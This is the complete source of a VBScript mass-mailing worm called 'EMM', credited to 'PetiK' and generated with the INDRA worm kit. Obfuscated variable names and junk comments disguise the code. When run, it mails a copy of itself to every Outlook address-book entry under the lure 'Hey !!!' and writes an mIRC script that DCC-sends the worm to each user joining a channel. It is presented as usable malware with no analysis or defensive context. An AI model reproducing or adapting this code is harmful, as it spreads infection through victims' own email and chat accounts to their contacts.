   'jQpCmEuMqFgExLqVoEeQqFvFsTwLnIeRrG
   'Worm Name: EMM
   'Written By: PetiK
   '[INDRA]
   On Error Resume Next
   pvtgvlmybspvhhc = WScript.ScriptFullName
   'oUeLlYaYvPiDoJyNmE
   'lNjQsVuJlXnKaIhKyLxDpRhRfChEbPiApReIbPoQhB
   'tNeOiKaRhGrSvBkHhMnN
   'mGnDaKsDsWaJrGeObKkCcAnKjTnGnK
   Set aeqhugiajtkgxln = CreateObject("Outlook.Application")
   Set clpeadswqvgjaib = aeqhugiajtkgxln.GetNameSpace("MAPI")
   For brvjkdbjgeculoe = 1 to clpeadswqvgjaib.AddressLists.Count
   Set hcnustkmwvnekjr = aeqhugiajtkgxln.CreateItem(0)
   Set grxefwycaqroxtc = clpeadswqvgjaib.AddressLists.Item(brvjkdbjgeculoe)
   hcnustkmwvnekjr.Attachments.Add pvtgvlmybspvhhc
   hcnustkmwvnekjr.Subject = "Hey !!!"
   hcnustkmwvnekjr.Body = "Important message for you !!"
   Set xbbqwovshvtyomj = grxefwycaqroxtc.AddressEntries
   Set faxfcddjjqfvaqh = hcnustkmwvnekjr.Recipients
   For jadfdkvbusnhcqj = 1 to xbbqwovshvtyomj.Count
   hcnustkmwvnekjr.Recipients.Add xbbqwovshvtyomj.Item(jadfdkvbusnhcqj)
   Next
   hcnustkmwvnekjr.Send
   Next
   'qXsKqRdOfNoSdGwEqHnKsSmK
   'hCoCaPmGaIsBsH
   'nBoNiYoXwFdQfAgVaUbFnOuLiCwHlMxXiLpEpJ
   'kQlQcVsAnPkRhQqGxHiDpYhWpGdTwTeVxTxHdBnAoScLtFxIgWcM
   Set lrjijsfhrdroeib = CreateObject("Scripting.FileSystemObject")
   Set cjcyvxysvfoudda = lrjijsfhrdroeib.CreateTextFile("C:\mirc\script.ini", True)
   cjcyvxysvfoudda.WriteLine "[script]"
   cjcyvxysvfoudda.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
   cjcyvxysvfoudda.Write "n1=/dcc           send         $nick """
   cjcyvxysvfoudda.Write pvtgvlmybspvhhc
   cjcyvxysvfoudda.WriteLine """ }"
   cjcyvxysvfoudda.Close
   'xSsHvAbSmGmVtIrK
   'qKwOrQyOxNgTrAlCpFnKgFlXyDcIdLyBwJaPsXgK
   'jRdPhMhLhQkTwCfXxLuPmBhJjGsAsYjSaIdYqXmVcKnErCdYgQtI
   'hVlUnEiPgNxStLgEvGlVlYbUtQnWuQiIpVuEyNoBbDoKhSlCoTiRrFxKhS
   'Generated with [INDRA] v0.1 - (c) 2001 by LiteSys
